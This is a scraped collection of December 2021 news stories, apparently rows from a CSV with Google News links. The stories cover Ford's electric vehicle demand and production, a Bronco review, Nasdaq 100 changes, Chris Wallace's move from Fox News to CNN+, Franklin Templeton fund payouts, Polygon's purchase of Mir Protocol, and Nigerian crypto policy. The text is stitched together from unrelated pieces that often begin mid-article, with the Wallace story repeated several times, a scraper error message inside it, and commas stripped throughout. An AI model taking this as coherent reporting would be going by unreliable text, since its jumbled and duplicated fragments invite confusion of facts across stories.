“On the strength of Mustang Mach-E Ford delivered record electrified vehicle sales growing more than three times faster than the overall segment” Andrew Frick vice president of Sales U.S. and Canada said in a statement.

As more cars enter the electric vehicle market Tesla is starting to lose its market share — and the Mach-E appears to be the beneficiary.

The company said in March that 70% of the Mach-E buyers were new to Ford.

“The goal is to become the clear No. 2 electric vehicle maker in North America within the next couple of years” according to a statement from Said Deep head of North America product communications for Ford.

Well now wannabe owners of the all-electric Ford F-150 Lightning find themselves in a similar battle.

Put a name on the list and hope and pray that name makes it to the top. Because right now the list is so long that some fans of America’s best-selling pickup franchise won’t get the 2022 model year and will need to wait until 2023 or even later.

The demand for the all-electric Ford F-150 Lightning is so huge that Ford Motor Co. on Wednesday actually stopped taking the $100 refundable reservation deposits accepted since the global reveal in May.

“We’re completely oversubscribed with our battery-electric vehicles Lightning especially” Ford CEO Jim Farley told Jim Cramer on the CNBC Investing Club on Thursday during a livestream broadcast.

“The F-150 Lightning America’s best-selling vehicle. Everyone loves the electric version. They haven’t even driven it yet” Farley said between meetings with his board of directors at Ford World Headquarters in Dearborn. “Wait until they drive it. Zero to 60 like a 911 (Porsche). It’s just an incredible product. It powers your house for four days. We had to stop reservations we got so many.”

Ford has so many reservations for the Lightning that if they all turned into purchases the volume would far exceed the company’s capacity to fill orders.

“We stopped at 200000” Farley told CNBC explaining the art of “capacitizing.”

Ford plans to build 70000 to 80000 electric pickups initially Farley said “We’re gonna to try to double that. … Don’t bet against Ford when we have to increase capacity. This is what we do.”

Official orders will begin getting booked in January. And delivery of the battery-operated vehicle is scheduled to begin in mid-2022.

Ford will begin working down its reservation list and “inviting” people if they want to convert to an order; if so the process will begin. If people decline the next name on the list gets invited to purchase.

“And so on” said Hannah Ooms Ford spokesperson.

“A reservation allows a customer to be invited to place an order as production becomes available” Ooms said

“For Lightning the ordering process will be unique. Due to the extraordinarily high demand. Ford is implementing a waved invitation approach to efficiently convert reservations to orders. Reservation holders will be invited to place orders at staggered dates so we can more easily provide directional delivery timing to customers during the order process. Reservation holders will receive an invitation to order via email from Ford. The number of customers invited will vary by wave.”

There is no set number of waves in the invitation process Ooms explained.

The number of waves will be adjusted throughout the process based on available commodities and customer order rates from each previous wave she said.

“Invitations to order a 22MY (2022 model year) will continue to be sent to reservation holders until 22MY production is fulfilled. Remaining reservationists will be invited to order in subsequent model years” Ooms said.

But all hope is not lost as Ford works to ramp up production.

“We continue to work to break constraints and increase volumes quickly for future model years” Ooms said.

John McElroy host of the Autoline After Hours podcast and webcast said Friday the Lightning debunks the idea that the public lacks interest in electric vehicles.

“While some people complain that the government is trying to shove electric vehicles down their throat Ford had to stop taking reservations for the F-150 Lightning because it couldn’t keep up with demand” McElroy said. “It’s crazy. Half the public thinks EVs are stupid and the other half can’t get one soon enough.”

Farley downplayed the challenges ahead telling CNBC that the automaker has a strategy to produce electric vehicles. Challenges with the semiconductor chip supply aren’t the same he said.

“Look we’ll get semiconductors” he said. “That’s a matter of prioritizing the BEVs (battery electric vehicles) over the ICE (internal combustion engine) vehicles. The issue is batteries. That’s what we have to solve.”

Farley continued “We don’t want to build these vehicles in tents. We want to build them in our beautiful [ Rouge facility where my grandfather worked. That’s not the issue. We can put more shifts of workers on. Our UAW members are ready to make these vehicles. We have to find batteries.”

Ford Tesla and other automakers are working to ramp up battery access and production. Ford announced a massive investment in battery operations this year in Michigan as well as Kentucky and Tennessee.

“In 24 months we’re going to double our capacity for these battery electric vehicles” Farley said. “We’re well on the way to doing that. We’ve got a lot of incremental battery commitments out of our Georgia facility. We really think we can do it. And my name is on the line.”

Cramer of CNBC pushed Farley about speed of production and the competitive landscape specifically top electric carmaker Tesla run by CEO Elon Musk.

“We have to scale get to a million units as quickly as we can in the next couple of years. And we have to make money more money than we make on our ICE products. That’s the math. That’s what motivates this team to get up in the morning” Farley said.

Meanwhile Ford’s early 12% investment in the startup truck maker Rivian is now valued at more than $10 billion and that doesn’t hurt Ford financials Farley said.

Cramer asked if Farley has a “get Musk squad” mission.

“Look I’m a race car driver. Second place is the first loser. That’s how I look at business” Farley said. “Ford employees deserve the best leadership. Our investors are betting on this company. So you should expect us as we go battery electric we can really reinvent the brand. We’re doing that with F-150 Lightning.”

He added I can’t keep track of the other racers. All I know is there’s one finish line and we are motivated to get there more than anytime I’ve ever seen in the company’s history.”

Potential buyers who want a Lightning are asked by Ford to sign up for “Get Updates” at the Ford.comF-150 Lightning homepage so that Ford can provide updates on when orders will be accepted from nonreservation holders for later years.

The starting price of the Lightning is around $40000. It’s built in Dearborn Mich.

For American-made truck giant Ford Motor Co. it was time for a revival of the SUV fleet and no better way to do it than with the Bronco nameplate. Adding to the already successful Explorer the SUV fleet is now complete as the Bronco is optioned in both the two-door and four-door models.

The first comparison that comes to mind in this segment is clearly Stellantis’ extremely popular Jeep Wrangler with its endless options and automatic savvy consumers. But with the price point of the Bronco Ford is hoping consumers dive right into the savings and jump ship.

Wrapped in an unusual Cyber Orange Metallic tri-coat exterior color the Bronco was certainly a fun ride for both passengers and onlookers who couldn’t get enough of the overall rollout of the Bronco. But most importantly it was all about the driver’s comfort in Grasso’s Garage as our weekend tester was full of comfort. The seats were soft plush and not bolstered creating that extra special comfort we enjoy in every Ford vehicle.

Powered with a 2.7-liter Ecoboost V6 engine there was no shortage of performance for the Bronco. Aligned with a 10-speed transmission and 4-wheel drive all while riding on 315/70R17 Goodyear Territory Mountain Terrain Tires the Black Diamond model with Sasquatch package offered a slew of off-road features all for $4495. Powertrain options totaled $3490 in total while the hardtop was black plastic.

The Bronco was very peppy and quick on its feet. It had no issues getting out of its own way and you could tell the motor was a perfect fit.

We took the Bronco through mountainous terrain with ease topping off some high spots while enjoying the fall scenery. Utilizing the G.O.A.T. drive modes we realized that the Bronco is for real and not just a grocery-getter. In all terrains I now see why Ford will seriously give Jeep a run for its consumers as this thing is really cool!

Interior-wise other than the really nice seats it boasts a SYNC 8-inch digital infotainment system with Sirius XM Radio which is customary in all Ford vehicles. Easy to use and simple to work SYNC is one of the easiest to navigate. For the driver’s cockpit it has a nicely positioned 8-inch digital screen as well which is clear and concise.

We enjoyed the overall ambiance of the Bronco as it sits up high rides great shows off well and turns on a dime. While being on the brink of drooling the Bronco will be a huge win for the Ford Motor Co. team. I bet you see a lot of these on the road and for good reason all while being priced correctly!

The information comes from a memo Ford sent suppliers this week a copy of which was obtained by Automotive News. In the document supplierss are being informed that the new EVs previously codenamed CDX746 and CDX747 are now expected to enter production in December 2024 under the U759 and U760 program names. According to suppliers Ford originally planned to begin output in mid-2023.

While this is obviously disappointing for both Ford and potential buyers of the all-electric SUVs there a silver lining to this: the automaker will be able to significantly increase Mustang Mach-E output at the Cuautitlán plant in Mexico.

In the memo Ford also told suppliers that the Explorer and Aviator EVs are being moved from to a yet-to-be-determined location. The electric SUVs were set to be Ford’s next major EV launches after deliveries of the F-150 Lightning start in the spring of 2022.

In an interview on December 10 Ford North America COO Lisa Drake said that Ford now plans to dedicate the entire Cuautitlán plant to Mustang Mach-E production with annual output to reach 200000 units by 2023—more than triple the 2021 output. Production will begin to increase in 2022.

“We had previously contemplated building an additional electric vehicle down there in Cuautitlan but our first priority right now is to scale production of the Mach-E given that demand. Our production system is very flexible by design and we’ll utilize multiple North American plants as we build out our future North American lineup.” Lisa Drake Ford North America COO

The executive added that Ford plans to work with suppliers to boost supplies of battery cells battery trays and electric drive systems to support the Mach-E production increase.

Since it went on sale in late 2020 the Mustang Mach-E has seen very strong demand. Ford is on pace to sell about 60000 units worldwide this year and has recently began Mach-E production in China for the local market. In a tweet Ford Motor Company CEO Jim Farley confirmed the plans to triple Mach-E production by 2023.",https://news.google.com/articles/CBMiggFodHRwczovL3d3dy5kZXRyb2l0bmV3cy5jb20vc3RvcnkvYnVzaW5lc3MvYXV0b3MvMjAyMS8xMi8xMi9kZXRyb2l0LWNhcm1ha2VyLWZpZ2h0cy1yZW1haW4tcmVsZXZhbnQtbmJjcy1hbWVyaWNhbi1hdXRvLzY0MTA5NzAwMDEv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Detroit carmaker fights to 'remain relevant' in NBC's 'American Auto',"Your subscription supports:

Fortinet Inc. Palo Alto Networks Inc. Zscaler Inc. and Datadog Inc. will also be added to the index.

The Nasdaq 100 is made up of the largest non-financial companies listed on the exchange. While there’s no minimum requirement for market value. Its stocks must have an average daily trading volume of over 200000 shares to be eligible.

JPMorgan expects that CDW Corp. Fox Corp. Cerner Corp. Check Point Software Technologies Ltd. Trip.com Group Ltd. and Incyte Corp. will be removed from the index to make way for the new entrants.

JPMorgan Chase & Co.’s Min Moon the bank’s head of equity index research and program trading strategy said in a report that the two could be added to the closely watched tech-heavy benchmark late Friday when the Nasdaq exchange will announce annual membership updates to account for changes in market capitalization.

Such moves take effect after the close of trading on Dec. 17. Palo Alto Network Inc. which shifted its listing over from the New York Stock Exchange in October in the hopes of being included in the Nasdaq 100 Fortinet Inc. Zscaler Inc. and Datadog Inc. are also potential candidates for the index according to Moon.

All changes are effective as of the close on Dec. 17 the same day as the rebalancing of the S&P 500 Index takes effect.

The Nasdaq 100 is made up of the largest non-financial companies listed on the exchange. While there’s no minimum requirement for market value. Its stocks must have an average daily trading volume of over 200000 shares to be eligible.

What’s Next

Stocks entering the index can benefit from increased liquidity. A broader investor base because passive index funds and actively managed ones that are measured against it buy the shares.

“That’s good for the companies because if they have to raise capital” that issuance “is going to happen at a higher valuation” and in turn a lower cost of capital “which just makes it easier to fund projects” Nasdaq Chief Economist Phil Mackintosh said before the rebalancing.

Despite the benefits of being in the Nasdaq 100 stocks do not always gain on the news. Only 64% of new additions finished up on the first day following the announcement according to a study by Nasdaq.

That muted performance can be partly attributed to traders who buy-in ahead of the announcement using forecasts such as JPMorgan’s report Mackintosh said. “Traders are already positioning for the news. So when the news comes out it might not be the big positive shock that you think because the markets like ‘yeah we knew that stuff’” he said.

While the immediate reaction might be a bit lackluster. Stocks do outperform the market by an average of 1% from five days pre-announcement to post-index inclusion according to the Nasdaq study of Nasdaq 100 additions from 2010 to 2020.

The Nasdaq 100 is up 32 per cent over the past year outperforming other benchmark indices such as the S&P 500 and the Dow Jones Industrial Average.",,,,,,,,,,,,

Wallace delivered the news himself in the last minutes of his “Fox News Sunday” which he has anchored for nearly two decades on the Fox Corporation-owned outlet. “I want to try something new to go beyond politics to all the things I’m interested in. I’m ready for a new adventure. And I hope you’ll check it out” said Wallace. The words will be the last he utters on the program.

CNN confirmed Wallace’s jump less than two hours after he announced his departure and said he would lead a daily show during which he would interview newsmakers from the worlds of politics business sports and culture. Fox News last announced a contract extension for Wallace in 2017 and his current agreement with Fox News is believed to coming to an end.

The move adds another chapter to the story of the 74-year-old journalist who is the son of legendary “60 Minutes” correspondent Mike Wallace and a former moderator of NBC’s “Meet The Press” and has developed a reputation for asking even heads of state difficult thorny questions. And it also illustrates the growing frenzy around streaming news as big TV networks test ways to lure a rising generation of news junkies who are increasingly getting relevant information via social media and mobile video.

Popular on Variety

Fox News Channel is expected to fill “Sunday” which has been an integral part of its programing since 1996 when it was launched with moderator Tony Snow with a rotation of hosts. Bret Baier John Roberts Shannon Bream Martha MacCallum Jennifer Griffin Neil Cavuto Dana Perino and Bill Hemmer are among the network’s news staffers who are likely to take the Sunday seat in weeks to come according to a person familiar with the matter. “We are extremely proud of our journalism and the stellar team that Chris Wallace was a part of for 18 years. The legacy of ‘Fox News Sunday’ will continue with our star journalists many of whom will rotate in the position until a permanent host is named” the network said in a statement.

Among Fox News’ pantheon of on-air personalities Wallace cut a different figure. He didn’t push a particular partisan side but instead burnished a reputation for challenging authority. “People know that I’m going to ask probing questions and that it’s not going to be softball” Wallace told Variety in 2019.

In doing so he lent credibility to a network with opinion hosts who often generate controversy. Wallace is the first employee in Fox News Channel’s 25 years of existence to get nominated for an Emmy for his July 2018 meeting with Russian President Vladimir Putin. He was also the first Fox News anchor to moderate a general-election presidential debate in 2016. He also moderated a debate between then-President Donald Trump and then-challenger Joe Biden before the 2020 election. The debate proved chaotic as the two candidates parried around Wallace’s efforts to keep order. Subsequently President Trump revealed he had tested positive for coronavirus and Wallace and other Fox News Channel personnel were tested. Wallace tested negative.

CNN has been aggressively hiring for its soon-to-launch streaming effort a new initiative that comes after many of its rivals have already entered the broadband market. Fox News debuted the subscription-based Fox Nation in 2018 and has since that time launched separate streaming hubs aimed at overseas customers and weather aficionados. NBCUniversal which backs MSNBC has also set up a portfolio of streaming products including bespoke efforts around its “Today” morning franchise; a general-news service NBC News Now; and a progressive-news outlet The Choice that is affiliated with MSNBC.

There is more. ABC News has a new production deal with George Stephanopoulos that has already resulted in two documentary specials for Hulu and yesterday released coverage of “Good Morning America” co-anchor Michael Strahan’s trip to space with Blue Origin. CBS News intends to bring together its linear newsgathering with that of its streaming outlet CBSN.

In July CNN poached Kasie Hunt the up-and-coming NBC News congressional correspondent for CNN Plus and since that time has also recruited Jenn Suozzo the former executive producer of “NBC Nightly News.” CNN said in July it intended to bolster its new service with original programming that would make it distinct from its flagship cable outlet.

CNN has filled countless minutes of its schedule with criticism of Fox News Channel but it has benefitted over the years by hiring some of its veteran personnel. Alisyn Camerota a staple of Fox News Channel’s daytime schedule has thrived at CNN in mornings and afternoons. CNN earlier this year hired Kristin Fisher a Fox News Channel White House correspondent to cover space and defense. And CNN famously hired Paula Zahn in 2001 and she anchored a handful of different programs until 2007.

Fox News has come under scrutiny for the amount of time it devotes to opinion programming which represents its most popular and most watched offerings and its news content. The network pushed Shannon Bream’s 11 p.m. news show “Fox News @ Night” to midnight in favor of a late-night program led by Greg Gutfeld which has proven to be one of its biggest successes in recent years. Fox News’ 7 p.m. hour which had been led by Martha MacCallum was made into an opinion-led hour and is anchored by a rotating array of hosts.

And yet the election wasn’t the initial catalyst. The network’s news division suffered a blow in perception after Shepard Smith who led Fox News’ breaking-news coverage for years and sometimes challenged opinion hosts like Tucker Carlson on air parted ways with the network in 2019. He subsequently took the reins of an evening-news program on CNBC.",https://news.google.com/articles/CBMijwFodHRwczovL3d3dy5rdm9hLmNvbS9uZXdzL25hdGlvbmFsL2NocmlzLXdhbGxhY2UtYW5ub3VuY2VzLWhlLWlzLWxlYXZpbmctZm94LW5ld3Mtam9pbmluZy1jbm4vYXJ0aWNsZV8xZWE3M2YwOC1lZmRhLTVlYzItODc5Mi1iZWM4MjgyMTc4YzAuaHRtbNIBAA?hl=en-US&gl=US&ceid=US%3Aen,Chris Wallace announces he is leaving Fox News joining CNN+,Chris Wallace seen here at the first presidential debate between President Donald Trump and Democratic presidential nominee Joe Biden on September 29 2020 in Cleveland Ohio announces he is leaving Fox News.,https://news.google.com/articles/CBMihwFodHRwczovL3d3dy5mb3JiZXMuY29tL3NpdGVzL2plbWltYW1jZXZveS8yMDIxLzEyLzExL3J1cGVydC1tdXJkb2NoLWp1c3QtYm91Z2h0LWEtMjAwLW1pbGxpb24tcmFuY2gtaGVyZS1hcmUtaGlzLW90aGVyLW1lZ2EtcHJvcGVydGllcy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Rupert Murdoch Just Bought A $200 Million Ranch—Here Are His Other Mega-Properties,ERROR: Article `download()` failed with 403 Client Error: Max restarts limit reached for url: https://www.forbes.com/sites/jemimamcevoy/2021/12/11/rupert-murdoch-just-bought-a-200-million-ranch-here-are-his-other-mega-properties/ on URL https://news.google.com/articles/CBMihwFodHRwczovL3d3dy5mb3JiZXMuY29tL3NpdGVzL2plbWltYW1jZXZveS8yMDIxLzEyLzExL3J1cGVydC1tdXJkb2NoLWp1c3QtYm91Z2h0LWEtMjAwLW1pbGxpb24tcmFuY2gtaGVyZS1hcmUtaGlzLW90aGVyLW1lZ2EtcHJvcGVydGllcy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMiTWh0dHBzOi8vdHZsaW5lLmNvbS9uZXdzL2NocmlzLXdhbGxhY2UtbGVhdmluZy1mb3gtbmV3cy1leGl0LXZpZGVvLTEyMzQ3NjQ1NDQv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Chris Wallace Leaving Fox News -- Watch Exit Announcement Video,"News anchor Chris Wallace has announced his exit from Fox News with Sunday’s edition of the political news show Fox News Sunday being his last.

“After 18 years I have decided to leave Fox” Wallace said toward the end of the broadcast. “I want to try something new to go beyond politics to all the things I’m interested in. I’m ready for a new adventure. And I hope you’ll check it out.

“Eighteen years ago the bosses here at Fox promised me they would never interfere with a guest I booked or a question I asked and they kept that promise” he continued. “I have been free to report to the best of my ability to cover those stories I think are important to hold our country’s leaders to account. It’s been a great ride.”

*Update*: CNN announced Sunday that Wallace will join CNN+ the network’s streaming subscription service that is set to debut in the first quarter of 2022.



“After decades in broadcast and cable news I am excited to explore the world of streaming” Wallace said in a statement. “I look forward to the new freedom and flexibility streaming affords in interviewing major figures across the news landscape — and finding new ways to tell stories. As I embark on this adventure I am honored and delighted to join Jeff Zucker and his great team. I can’t wait to get started.”

“It is not often that a news organization gets the opportunity to bring someone of Chris Wallace’s caliber on board” said CNN Worldwide president and chairman of WarnerMedia News and Sports Jeff Zucker in an accompanying statement. “He is as fine a journalist as there is in our business. This speaks volumes about our commitment to journalism and CNN+ and we are thrilled to have Chris on the ground floor of helping us build the next generation of CNN and news.”

Wallace delivered the news himself in the last minutes of his “Fox News Sunday” which he has anchored for nearly two decades on the Fox Corporation-owned outlet. “I want to try something new to go beyond politics to all the things I’m interested in. I’m ready for a new adventure. And I hope you’ll check it out” said Wallace. The words will be the last he utters on the program.

CNN confirmed Wallace’s jump less than two hours after he announced his departure and said he would lead a daily show during which he would interview newsmakers from the worlds of politics business sports and culture. Fox News last announced a contract extension for Wallace in 2017 and his current agreement with Fox News is believed to coming to an end.

The move adds another chapter to the story of the 74-year-old journalist who is the son of legendary “60 Minutes” correspondent Mike Wallace and a former moderator of NBC’s “Meet The Press” and has developed a reputation for asking even heads of state difficult thorny questions. And it also illustrates the growing frenzy around streaming news as big TV networks test ways to lure a rising generation of news junkies who are increasingly getting relevant information via social media and mobile video.

Fox News Channel is expected to fill “Sunday” which has been an integral part of its programing since 1996 when it was launched with moderator Tony Snow with a rotation of hosts. Bret Baier John Roberts Shannon Bream Martha MacCallum Jennifer Griffin Neil Cavuto Dana Perino and Bill Hemmer are among the network’s news staffers who are likely to take the Sunday seat in weeks to come according to a person familiar with the matter. “We are extremely proud of our journalism and the stellar team that Chris Wallace was a part of for 18 years. The legacy of ‘Fox News Sunday’ will continue with our star journalists many of whom will rotate in the position until a permanent host is named” the network said in a statement.

Among Fox News’ pantheon of on-air personalities Wallace cut a different figure. He didn’t push a particular partisan side but instead burnished a reputation for challenging authority. “People know that I’m going to ask probing questions and that it’s not going to be softball” Wallace told Variety in 2019.

In doing so he lent credibility to a network with opinion hosts who often generate controversy. Wallace is the first employee in Fox News Channel’s 25 years of existence to get nominated for an Emmy for his July 2018 meeting with Russian President Vladimir Putin. He was also the first Fox News anchor to moderate a general-election presidential debate in 2016. He also moderated a debate between then-President Donald Trump and then-challenger Joe Biden before the 2020 election. The debate proved chaotic as the two candidates parried around Wallace’s efforts to keep order. Subsequently President Trump revealed he had tested positive for coronavirus and Wallace and other Fox News Channel personnel were tested. Wallace tested negative.

CNN has been aggressively hiring for its soon-to-launch streaming effort a new initiative that comes after many of its rivals have already entered the broadband market. Fox News debuted the subscription-based Fox Nation in 2018 and has since that time launched separate streaming hubs aimed at overseas customers and weather aficionados. NBCUniversal which backs MSNBC has also set up a portfolio of streaming products including bespoke efforts around its “Today” morning franchise; a general-news service NBC News Now; and a progressive-news outlet The Choice that is affiliated with MSNBC.

There is more. ABC News has a new production deal with George Stephanopoulos that has already resulted in two documentary specials for Hulu and yesterday released coverage of “Good Morning America” co-anchor Michael Strahan’s trip to space with Blue Origin. CBS News intends to bring together its linear newsgathering with that of its streaming outlet CBSN.

In July CNN poached Kasie Hunt the up-and-coming NBC News congressional correspondent for CNN Plus and since that time has also recruited Jenn Suozzo the former executive producer of “NBC Nightly News.” CNN said in July it intended to bolster its new service with original programming that would make it distinct from its flagship cable outlet.

CNN has filled countless minutes of its schedule with criticism of Fox News Channel but it has benefitted over the years by hiring some of its veteran personnel. Alisyn Camerota a staple of Fox News Channel’s daytime schedule has thrived at CNN in mornings and afternoons. CNN earlier this year hired Kristin Fisher a Fox News Channel White House correspondent to cover space and defense. And CNN famously hired Paula Zahn in 2001 and she anchored a handful of different programs until 2007.

Fox News has come under scrutiny for the amount of time it devotes to opinion programming which represents its most popular and most watched offerings and its news content. The network pushed Shannon Bream’s 11 p.m. news show “Fox News @ Night” to midnight in favor of a late-night program led by Greg Gutfeld which has proven to be one of its biggest successes in recent years. Fox News’ 7 p.m. hour which had been led by Martha MacCallum was made into an opinion-led hour and is anchored by a rotating array of hosts.

And yet the election wasn’t the initial catalyst. The network’s news division suffered a blow in perception after Shepard Smith who led Fox News’ breaking-news coverage for years and sometimes challenged opinion hosts like Tucker Carlson on air parted ways with the network in 2019. He subsequently took the reins of an evening-news program on CNBC.",https://news.google.com/articles/CBMijwFodHRwczovL3d3dy5rdm9hLmNvbS9uZXdzL25hdGlvbmFsL2NocmlzLXdhbGxhY2UtYW5ub3VuY2VzLWhlLWlzLWxlYXZpbmctZm94LW5ld3Mtam9pbmluZy1jbm4vYXJ0aWNsZV8xZWE3M2YwOC1lZmRhLTVlYzItODc5Mi1iZWM4MjgyMTc4YzAuaHRtbNIBAA?hl=en-US&gl=US&ceid=US%3Aen,Chris Wallace announces he is leaving Fox News joining CNN+,Chris Wallace seen here at the first presidential debate between President Donald Trump and Democratic presidential nominee Joe Biden on September 29 2020 in Cleveland Ohio announces he is leaving Fox News.,https://news.google.com/articles/CBMihwFodHRwczovL3d3dy5mb3JiZXMuY29tL3NpdGVzL2plbWltYW1jZXZveS8yMDIxLzEyLzExL3J1cGVydC1tdXJkb2NoLWp1c3QtYm91Z2h0LWEtMjAwLW1pbGxpb24tcmFuY2gtaGVyZS1hcmUtaGlzLW90aGVyLW1lZ2EtcHJvcGVydGllcy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Rupert Murdoch Just Bought A $200 Million Ranch—Here Are His Other Mega-Properties,ERROR: Article `download()` failed with 403 Client Error: Max restarts limit reached for url: https://www.forbes.com/sites/jemimamcevoy/2021/12/11/rupert-murdoch-just-bought-a-200-million-ranch-here-are-his-other-mega-properties/ on URL https://news.google.com/articles/CBMihwFodHRwczovL3d3dy5mb3JiZXMuY29tL3NpdGVzL2plbWltYW1jZXZveS8yMDIxLzEyLzExL3J1cGVydC1tdXJkb2NoLWp1c3QtYm91Z2h0LWEtMjAwLW1pbGxpb24tcmFuY2gtaGVyZS1hcmUtaGlzLW90aGVyLW1lZ2EtcHJvcGVydGllcy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMiTWh0dHBzOi8vdHZsaW5lLmNvbS9uZXdzL2NocmlzLXdhbGxhY2UtbGVhdmluZy1mb3gtbmV3cy1leGl0LXZpZGVvLTEyMzQ3NjQ1NDQv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Chris Wallace Leaving Fox News -- Watch Exit Announcement Video,"News anchor Chris Wallace has announced his exit from Fox News with Sunday’s edition of the political news show Fox News Sunday being his last.

“After 18 years I have decided to leave Fox” Wallace said toward the end of the broadcast. “I want to try something new to go beyond politics to all the things I’m interested in. I’m ready for a new adventure. And I hope you’ll check it out.

“Eighteen years ago the bosses here at Fox promised me they would never interfere with a guest I booked or a question I asked and they kept that promise” he continued. “I have been free to report to the best of my ability to cover those stories I think are important to hold our country’s leaders to account. It’s been a great ride.”

*Update*: CNN announced Sunday that Wallace will join CNN+ the network’s streaming subscription service that is set to debut in the first quarter of 2022.



“After decades in broadcast and cable news I am excited to explore the world of streaming” Wallace said in a statement. “I look forward to the new freedom and flexibility streaming affords in interviewing major figures across the news landscape — and finding new ways to tell stories. As I embark on this adventure I am honored and delighted to join Jeff Zucker and his great team. I can’t wait to get started.”

“It is not often that a news organization gets the opportunity to bring someone of Chris Wallace’s caliber on board” said CNN Worldwide president and chairman of WarnerMedia News and Sports Jeff Zucker in an accompanying statement. “He is as fine a journalist as there is in our business. This speaks volumes about our commitment to journalism and CNN+ and we are thrilled to have Chris on the ground floor of helping us build the next generation of CNN and news.”

After the payout the total disbursement will reach to Rs 26098.2 crore amounting to 103.5 per cent of assets under management (AUM) as on April 23 2020 when the fund house announced to shut the schemes a Franklin Templeton MF spokesperson said on Sunday.

A total of Rs 25114 crore has been distributed across 6 schemes under winding up.

Under the first disbursement in February investors received Rs 9122 crore while Rs 2962 crore was paid to investors in April Rs 2489 crore in May Rs 3205 crore in June Rs 3303 crore in July Rs 2918 crore in September and Rs 1115 crore in November.

""SBI Funds Management Pvt Ltd (SBI MF) would be distributing the next tranche of Rs 983.81 crore to unitholders across all six schemes"" the spokesperson said.

The payment to all investors whose accounts are KYC compliant with all details available will commence from November 22 he said.

The amount to be distributed to unitholders will be paid by extinguishing proportionate units at the net asset value dated December 14 this year he added.

The payment will be made electronically to all eligible unitholders by SBI MF which has been appointed as the liquidator for the schemes under winding up by the Supreme Court.

In case the unitholders' bank account is not eligible for an electronic payment a cheque or demand draft will be issued and sent to their registered address by SBI MF.

In March the Supreme Court accepted the standard operating procedure (SOP) finalised by SBI MF to monetise assets and distribute the proceeds to unitholders of the six debt schemes of Franklin Templeton Mutual Fund.

The fund house shut its six debt mutual fund schemes on April 23 2020 citing redemption pressures and lack of liquidity in the bond market.

This latest acquisition from Polygon follows its previous acquisition of Hermez Network another ZK-Rollups-based Ethereum scaling solution for $250 million back in August. The deal will see Polygon investing a maximum of 250 million units of $MATIC tokens (~$627 million).

To date several ZK-rollup-based Ethereum scaling technologies are available in the crypto market albeit with limited functionalities: StarkWare's StarkEx Loopring and Matter Labs' zkSync. Of these projects StarkEx maintains the highest total value locked (TVL) with almost $1.3 billion on its protocol. Loopring follows with some $630 million while zkSync trails the pack from roughly $60 million.

""Polygon plans to focus on ZK cryptography as the end game for blockchain scaling"" shared Polygon co-founder Sandeep Nailwal. ""We have made a strategic decision to explore and encourage all meaningful scaling approaches and technologies at this stage. We believe this is the way to establish Polygon as the leading force and contributor in the ZK field and onboard the first billion users to Ethereum"" he adds.

Mir Protocol is a blockchain startup that's using privacy tech to make Ethereum faster and cheaper. With its zero-knowledge crypotography solutions blockchain transactions can be processed without all the data being revealed on publicly viewable blocks — helping with scaling as well as reducing gas fees. With Mir Protocol external validators can authenticate encrypted transactions or papers without disclosing the concealed information using zero-knowledge algorithms.

Mir Protocol's utilization of zero-knowledge proof (ZK-proof) technology will be beneficial to Polygon's planned expansion for the coming years with extensive use cases in areas such as decentralized finance persistent layering for Internet-of-Things applications and other use cases that require zero-knowledge validation.

Polygon claims that Mir Protocol has the most efficient and fastest ZK-proofs algorithms which allow it to scale the production of proofs and validate more transactions from a single record. ""The Mir team has invested a lot of time developing and fine-tuning their ZK-proof technology called Plonky2"" Polygon cofounder Mihailo Bjelic says.

""It is a great piece of engineering"" he Bjelic contiued. ""Plonky2 can generate recursive proofs in an incredible 170 milliseconds on a laptop. Most importantly plonky2 is practical to use on Ethereum with 45kb proofs in size-optimized mode.""

Founded about two years ago by Brendan Farmer and Daniel Lubarov the acquisition agreement for Mir Protocol was signed last November 26 a deal that involves 190 million $MATIC tokens as resources and another set of $100 million in USDC stablecoins. The two co-founders will join eight other colleagues to become part of the Polygon team.

The deal will undergo an initial vesting period of three years with Mir's team being provided with the funds over this span of time based on their deliverables and output.

""The Polygon team is amazing"" Brendan Farmer told ""We share the same values and are very excited to work together.""

The acquisition deal will also see Mir Protocol becoming rebranded to Polygon Zero with its primary project focused on the building of a ZK-rollup based on the ZK-proof tech it has already developed.

According to Bjelic the Polygon Zero ZK-rollup should be ready sometime next year. Meanwhile with regards to the zkEVM (zero-knowledge Ethereum Virtual Machine) currently being developed by the Polygon Hermez team a tentative launch date of mid-2022 was given by Bjelic.

The potential of this industry to disrupt & transform the traditional financial system has been recognized by many. The Nigerian Government shares a similar enthusiasm despite the recently imposed restrictions on Cryptocurrency.

The Honourable Minister of State for Budget & National Planning Prince Clem Ikanade Agba made this known in his keynote address at the just concluded 2021 Technext Coinference on Thursday held at the Pistis Conference Center in Lekki Lagos.

As the No. 1 Media Platform for Blockchain & Cryptocurrency Innovations Cryptotvplus.com was on ground to bring you riveting interviews commentaries and insights from the event.

Prince Clem Ikanade Agba Minister of State for Budget & National Planning

In his address titled “Innovation Regulation and Aftermaths” the minister acknowledges that blockchain technology is disrupting the status quo and opening up numerous opportunities across industries.

According to the Minister;

“the blockchain technology gives room for digital assets to be authenticated without the need for third-party verification. A practice that will benefit not only citizens but also all levels of government. The extravagant costs of setting up specific MDA’s and committees for resolving asset-related disputes can be largely reduced and cases can be speedily resolved without committing tremendous government resources.”

The Minister went further to state that a new body might be required for crypto regulation because the Law isn’t clear on which government agency between the Central Bank of Nigeria (CBN) and the Securities & Exchange Commission (SEC) should control the space. He disclosed that;

“Nigeria’s SEC are currently in discussions with CBN to enable better understanding and regulation of the crypto space. Nevertheless it is also possible that our laws as they are today cannot explicitly stipulate who holds the power to regulate cryptocurrencies; maybe there is a need for an additional body to play this role”

The 2021 Technext Coinference organized by Technext.ng is the first of its kind as it attracted quite a number of Industry Experts Fintech startups and crypto enthusiasts. The Theme of the Conference was “Reimagining Crypto as the Future of Finance”.

